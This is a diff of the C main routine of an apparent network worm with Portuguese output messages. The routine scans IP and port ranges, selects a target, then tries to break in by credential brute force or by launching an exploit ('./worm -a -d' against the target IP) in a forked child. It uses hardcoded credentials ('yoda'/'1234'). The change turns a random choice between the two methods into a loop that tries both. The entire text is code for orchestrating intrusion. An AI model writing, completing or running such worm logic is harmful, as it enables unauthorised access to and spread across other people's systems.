@@ -19,7 +19,7 @@ void main(int argc, char *argv[]){
     char **paramIPPort;
     char **entryExploit = malloc(4 * sizeof(char*));
     unsigned int lenKey;
-    int random, success, i;
+    int random, success, i, cont;
     pid_t child;
 
     if(argc < 4){
@@ -56,10 +56,7 @@ void main(int argc, char *argv[]){
     initPortScanner(range_ipSeq, range_portSeq);
     
     printf("Port Scanner finalizado\n"); 
-
-    srand(time(NULL));
-    random = rand();
-
+    
     paramIPPort = malloc(2*sizeof(char *));
     
     printf("-----------------------------------\n");
@@ -67,21 +64,34 @@ void main(int argc, char *argv[]){
     printf("-----------------------------------\n");
     
     target_selection(paramIPPort);
+        
+    printf("Target: %s %s\n",paramIPPort[0],paramIPPort[1]);
     
+    printf("\n");
     printf("Target Selection finalizado\n"); 
 
     printf("-----------------------------------\n");
     printf("Exploits iniciados\n"); 
     printf("-----------------------------------\n");
-    
+
     strncpy(entryExploit[0], "./worm", 20);
     strncpy(entryExploit[1], "-a", 20);
     strncpy(entryExploit[2], "-d", 20);
     strncpy(entryExploit[3], paramIPPort[0], 20);
     
-    if(random % 2){
-        success = bruteforce(lenKey, paramIPPort[0], username, pass);
-        if(success == EXIT_FAILURE){
+    srand(time(NULL));
+    random = rand();
+    cont = 0;
+    do{
+        if( (random % 2 + cont++) == 1 ){
+            printf("Usando força bruta\n");
+            
+            success = bruteforce(lenKey, paramIPPort[0], username, pass);
+        }
+        else
+        {
+            printf("Usando o exploit\n");
+            
             child = vfork();
             if(child == -1){
                 perror("");
@@ -91,34 +101,16 @@ void main(int argc, char *argv[]){
             }         
             strcpy(username, "yoda");
             strcpy(pass, "1234");
-
-            if(success == EXIT_FAILURE){
-                printf("Não foi possivel obter acesso.\n");
-                exit(0);
-            }
-
         }
-    }else{
-        child = vfork();
-        if(child == -1){
-            perror("");
-        }else if(child == 0){
-            success = exploitMain(4, entryExploit);
-            _exit(23);
-        }
-
-        strcpy(username, "yoda");
-        strcpy(pass, "1234");
         
-        if(success == EXIT_FAILURE){
-            success = bruteforce(lenKey, paramIPPort[0], username, pass);
-            if(success == EXIT_FAILURE){
-                printf("Não foi possivel obter acesso.\n");
-                exit(0);
-            }
-        }
+    }while(success == EXIT_FAILURE && cont<2);
+    
+    if(success == EXIT_FAILURE){
+        printf("Não foi possivel obter acesso.\n");
+        exit(0);
     }
-
+    
+    
     printf("-----------------------------------\n");
     printf("Exploits finalizados\n"); 
     printf("-----------------------------------\n");
